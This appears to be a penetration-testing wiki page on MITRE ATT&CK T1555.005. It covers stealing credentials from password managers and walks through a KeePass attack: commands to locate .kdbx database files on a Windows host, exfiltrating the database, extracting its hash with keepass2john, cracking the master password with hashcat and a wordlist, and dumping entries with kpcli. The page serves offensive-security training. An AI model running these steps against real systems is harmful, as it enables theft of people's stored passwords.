---
description: >-
  MITRE ATT&CK™ Credentials from Password Stores: Password Managers - Technique
  T1555.005
---

# Password managers

## Theory

Password managers generate and securely store passwords of various services, safeguarding them under a single master password. This master password serves as the key to access all the stored passwords within the password manager.&#x20;

Examples of Password Manager applications:

* [Built-in password managers (Windows)](windows-credential-manager.md)
* Third-party: KeePass, 1Password, LastPass

However, misconfiguration and security flaws are found in these applications that let us access stored data. Various tools could be used during the enumeration stage to get sensitive data in password manager applications used by Internet browsers and desktop applications.

## Practice

### KeePass

{% tabs %}
{% tab title="Cracking Master Password" %}
#### Cracking Master Password

If we gained access to the keepass database, we may be able to extract it and crack the master database password.&#x20;

Keepass database is stored as a `.kdbx` file, we can search for such files using following commands:

```powershell
#PowerShell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

#Cmd
dir /s /b C:\*.kdbx
```

One we exfiltrate the database to our attacking computer, we can start by using [keepass2john](https://gist.github.com/scottlinux/f6cb8b1bb7807e89c09c139064f69881) and save the output hase a crackable hash.

```bash
keepass2john keepass.kdbx > keepass.hash
```

Then, we may crack the master password using hashcat. See [this page](../passwd/brute-force/offline-password-cracking.md) for more details about cracking passwords.

```bash
hashcat -a 0 -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --user
```

Now, we can open the database using [kpcli](https://github.com/rebkwok/kpcli) and dump passwords

<pre class="language-bash"><code class="lang-bash">$ kpcli --kdb=db.kdbx
Provide the master password: *************************
<strong>kpcli:/> dir
</strong>=== Groups ===
Database/

<strong>kpcli:/> cd Database
</strong><strong>kpcli:/Database> dir
</strong>=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Sample Entry                                               keepass.info
1. Sample Entry #2                          keepass.info/help/kb/testform.
2. User Company Password

<strong>kpcli:/Database> show -f 0
</strong>Title: Sample Entry
Uname: User Name
 Pass: Password
  URL: https://keepass.info/
Notes: Notes
</code></pre>
{% endtab %}

{% tab title="KeePass Triggers" %}
TO DO
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://attack.mitre.org/techniques/T1555/005/" %}
